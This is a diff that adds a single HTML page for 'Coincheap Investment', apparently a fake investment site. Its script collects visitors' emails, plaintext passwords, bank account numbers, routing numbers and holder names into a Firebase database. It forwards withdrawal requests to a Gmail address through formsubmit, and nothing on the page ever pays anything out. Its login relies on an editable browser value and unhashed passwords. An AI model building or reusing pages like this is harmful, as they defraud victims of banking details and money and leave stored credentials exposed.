@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Coincheap Investment</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:Arial}body{background:#eef2ff}
+.card{background:#fff;padding:22px;border-radius:18px;margin:12px;box-shadow:0 6px 20px rgba(30,58,138,.1)}
+input,select{width:100%;padding:14px;margin:9px 0;border:2px solid #c7d2fe;border-radius:10px;font-size:16px}
+.btn{padding:15px;background:linear-gradient(90deg,#1e3a8a,#3b82f6);color:#fff;border:none;border-radius:12px;font-weight:900;width:100%;margin-top:12px}
+.btnGold{background:linear-gradient(90deg,#f59e0b,#d97706)}
+.tab{display:none}.tab.active{display:block}
+.nav{display:flex;gap:6px;padding:12px;background:#1e3a8a;position:sticky;top:0;z-index:99}
+.nav button{padding:11px;border:none;border-radius:10px;background:#172554;color:#fff;font-weight:800;flex:1}
+.nav button.active{background:#f59e0b;color:#000}
+.hero{background:linear-gradient(180deg,#1e3a8a,#172554);color:#fff;padding:35px 20px;text-align:center}
+.balCard{background:linear-gradient(135deg,#1e3a8a,#3b82f6);color:#fff;padding:24px;border-radius:20px;margin:12px}
+.bankItem{border:1px solid #c7d2fe;padding:12px;border-radius:12px;margin:8px 0;background:#f8fafc;display:flex;justify-content:space-between;align-items:center}
+</style>
+</head>
+<body>
+<div style="background:#1e3a8a;padding:14px;display:flex;justify-content:space-between;border-bottom:2px solid #f59e0b"><div style="font-weight:900;color:#fff">💎 Coincheap <span style="color:#f59e0b">Investment</span></div><div id="topEmail" style="font-size:11px;color:#fde68a"></div></div>
+<div class="nav"><button id="b1" class="active" onclick="showTab('home')">Home</button><button id="b2" onclick="showTab('register')">Register</button><button id="b3" onclick="showTab('login')">Login</button><button id="b4" onclick="showTab('dashboard')">Dashboard</button></div>
+
+<div id="home" class="tab active"><div class="hero"><h1>Coincheap <span style="color:#f59e0b">Investment</span></h1><p style="color:#bfdbfe;margin-top:8px">USA Investment • Direct to USA Banks</p></div><div class="card" style="text-align:center"><h2 style="color:#1e3a8a">Welcome to Coincheap Investment</h2><p style="margin-top:10px;color:#64748b">Create account to invest & withdraw to USA banks</p><button class="btn" onclick="showTab('register')" style="margin-top:15px">GET STARTED</button></div></div>
+
+<div id="register" class="tab"><div class="card" style="max-width:420px;margin:25px auto;border-top:5px solid #1e3a8a"><h2 style="text-align:center;color:#1e3a8a">Create Account</h2><input id="rEmail" placeholder="Email e.g akagaviani74@gmail.com"><input id="rPass" type="password" placeholder="Password"><input id="rCountry" value="USA"><button class="btn" onclick="signup()">CREATE ACCOUNT</button><p id="rMsg" style="text-align:center;font-weight:900;margin-top:12px"></p></div></div>
+
+<div id="login" class="tab"><div class="card" style="max-width:420px;margin:25px auto;border-top:5px solid #f59e0b"><h2 style="text-align:center;color:#1e3a8a">Login</h2><input id="lEmail" placeholder="Email"><input id="lPass" type="password" placeholder="Password"><button class="btn btnGold" onclick="login()">LOGIN</button><p id="lMsg" style="text-align:center;font-weight:900;margin-top:12px"></p></div></div>
+
+<div id="dashboard" class="tab"><div class="balCard"><p id="dashEmail" style="color:#fde68a;font-weight:900"></p><p>Total Balance</p><h1>$<span id="bal">0</span>.00</h1></div><div class="card" style="border-left:5px solid #1e3a8a"><h3>🏦 My USA Banks</h3><div id="myBanks" style="margin-top:10px">No bank yet</div><button class="btn" onclick="openBank()">+ Add USA Bank</button></div><div class="card" style="border-left:5px solid #f59e0b"><h3>💸 Withdraw</h3><input id="wAmount" type="number" placeholder="Amount"><button class="btn btnGold" onclick="requestWithdraw()">Request Withdrawal</button><p id="wMsg" style="color:green;font-weight:900;margin-top:8px"></p></div><div class="card"><button class="btn" style="background:#1e293b" onclick="logout()">Logout</button></div></div>
+
+<div id="bankModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:9999;padding:20px"><div style="background:#fff;padding:20px;border-radius:16px;max-width:400px;margin:30px auto"><div style="display:flex;justify-content:space-between"><h3>Add USA Bank</h3><button onclick="document.getElementById('bankModal').style.display='none'" style="background:red;color:#fff;border:none;padding:6px 12px;border-radius:8px">X</button></div><select id="mBank"><option>Huntington Bank</option><option>GLCU</option><option>Abri Credit Union</option><option>Navy Federal</option><option>Alliant</option><option>Chase</option></select><input id="mAcc" placeholder="Account Number"><input id="mRouting" placeholder="Routing Number"><input id="mName" placeholder="Holder Name"><select id="mType"><option>Checking</option><option>Savings</option></select><button class="btn" onclick="saveBank()">Save Bank</button><p id="mMsg" style="color:green;font-weight:900"></p></div></div>
+
+<script>function showTab(t){document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));document.querySelectorAll('.nav button').forEach(x=>x.classList.remove('active'));document.getElementById(t).classList.add('active');let m={home:'b1',register:'b2',login:'b3',dashboard:'b4'};document.getElementById(m[t]).classList.add('active');if(t=='dashboard')loadDash();}function openBank(){document.getElementById('bankModal').style.display='block';}function logout(){localStorage.removeItem('current_user');showTab('home');document.getElementById('topEmail').innerText='';}</script>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-app.js";
+import { getDatabase, ref, set, get, push } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyCLD9yedNA-llM6VU01L9gZ40jv36PlSsw",
+  authDomain: "coincheap-investment.firebaseapp.com",
+  databaseURL: "https://coincheap-investment-default-rtdb.firebaseio.com",
+  projectId: "coincheap-investment",
+  storageBucket: "coincheap-investment.firebasestorage.app",
+  messagingSenderId: "1065612358336",
+  appId: "1:1065612358336:web:1e9b4678e5df622bc9f325"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+window.signup = async function(){
+ let e=document.getElementById('rEmail').value.trim().toLowerCase(); let p=document.getElementById('rPass').value; 
+ if(!e||!p){document.getElementById('rMsg').innerText='Fill email & password';return;}
+ document.getElementById('rMsg').innerText='Creating...'; document.getElementById('rMsg').style.color='#1e3a8a';
+ try{
+   let key=e.replace(/[^a-zA-Z0-9]/g,'_');
+   let snap=await get(ref(db,'users/'+key));
+   if(snap.exists()){document.getElementById('rMsg').innerText='Account exists! Go to Login'; setTimeout(()=>showTab('login'),800); return;}
+   await set(ref(db,'users/'+key),{email:e,password:p,balance:0,created:new Date().toLocaleString()});
+   document.getElementById('rMsg').innerText='✅ Created! Opening Login...'; document.getElementById('rMsg').style.color='green';
+   setTimeout(()=>{showTab('login');document.getElementById('lEmail').value=e;},1200);
+ }catch(err){document.getElementById('rMsg').innerText='Error: '+err.message; document.getElementById('rMsg').style.color='red';}
+}
+
+window.login = async function(){
+ let e=document.getElementById('lEmail').value.trim().toLowerCase(); let p=document.getElementById('lPass').value;
+ if(!e||!p){document.getElementById('lMsg').innerText='Fill all';return;}
+ document.getElementById('lMsg').innerText='Checking...';
+ try{
+   let key=e.replace(/[^a-zA-Z0-9]/g,'_');
+   let snap=await get(ref(db,'users/'+key));
+   if(!snap.exists()){document.getElementById('lMsg').innerText='No account found - Register first';return;}
+   if(snap.val().password!=p){document.getElementById('lMsg').innerText='Wrong password';return;}
+   localStorage.setItem('current_user',e);
+   document.getElementById('lMsg').innerText='✅ Success!'; setTimeout(()=>showTab('dashboard'),600);
+ }catch(err){document.getElementById('lMsg').innerText='Error: '+err.message;}
+}
+
+window.loadDash = async function(){
+ let email=localStorage.getItem('current_user'); if(!email){showTab('login');return;}
+ document.getElementById('dashEmail').innerText=email; document.getElementById('topEmail').innerText=email;
+ try{
+   let key=email.replace(/[^a-zA-Z0-9]/g,'_');
+   let snap=await get(ref(db,'users/'+key));
+   document.getElementById('bal').innerText=snap.exists()?(snap.val().balance||0):0;
+   let bSnap=await get(ref(db,'banks/'+key));
+   let h=''; if(bSnap.exists()){Object.values(bSnap.val()).forEach(b=>{h+=`<div class="bankItem"><div><b style="color:#1e3a8a">${b.bank}</b><br><span style="font-size:12px">Acc:${b.acc} Rout:${b.routing}</span></div><div style="font-size:10px;background:#dbeafe;padding:4px 8px;border-radius:20px">USA</div></div>`});}
+   document.getElementById('myBanks').innerHTML=h||'No bank yet - Add USA Bank';
+ }catch(e){}
+}
+
+window.saveBank = async function(){
+ let email=localStorage.getItem('current_user'); if(!email){alert('Login first');return;}
+ let key=email.replace(/[^a-zA-Z0-9]/g,'_');
+ let bank=document.getElementById('mBank').value; let acc=document.getElementById('mAcc').value; let routing=document.getElementById('mRouting').value; let name=document.getElementById('mName').value; let type=document.getElementById('mType').value;
+ if(!acc||!routing||!name){document.getElementById('mMsg').innerText='Fill all';return;}
+ await push(ref(db,'banks/'+key),{bank,acc,routing,name,type,email,date:new Date().toLocaleString()});
+ document.getElementById('mMsg').innerText='✅ Saved!'; setTimeout(()=>{document.getElementById('bankModal').style.display='none';loadDash();},700);
+}
+
+window.requestWithdraw = async function(){
+ let amt=document.getElementById('wAmount').value; if(!amt){document.getElementById('wMsg').innerText='Enter amount';return;}
+ let email=localStorage.getItem('current_user')||'Guest';
+ await push(ref(db,'withdrawals'),{email,amount:amt,time:new Date().toLocaleString(),status:'pending'});
+ document.getElementById('wMsg').innerText='✅ Withdrawal $'+amt+' Sent to Admin!';
+ fetch("https://formsubmit.co/ajax/supportadmin46@gmail.com",{method:"POST",headers:{'Content-Type':'application/json'},body:JSON.stringify({subject:"WITHDRAWAL $"+amt+" - "+email,message:"Client: "+email+" Amount: $"+amt})});
+}
+</script>
+</body>
+</html>
